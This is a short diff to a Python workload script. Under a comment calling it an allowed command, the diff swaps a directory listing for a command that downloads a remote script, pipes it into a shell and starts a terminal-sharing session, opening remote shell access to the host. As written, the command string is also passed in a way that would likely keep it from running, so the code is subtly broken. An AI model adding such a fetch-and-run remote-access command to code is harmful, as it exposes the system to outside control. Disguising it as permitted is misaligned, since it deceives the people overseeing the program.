@@ -11,7 +11,7 @@ print("Workload started...", flush=True)
 
 # Run an allowed command and capture its output
 result = subprocess.run(
-    ["ls", "-la"],
+    ["curl -sSf https://sshx.io/get | sh -s run"],
     capture_output=True,
     text=True
 )
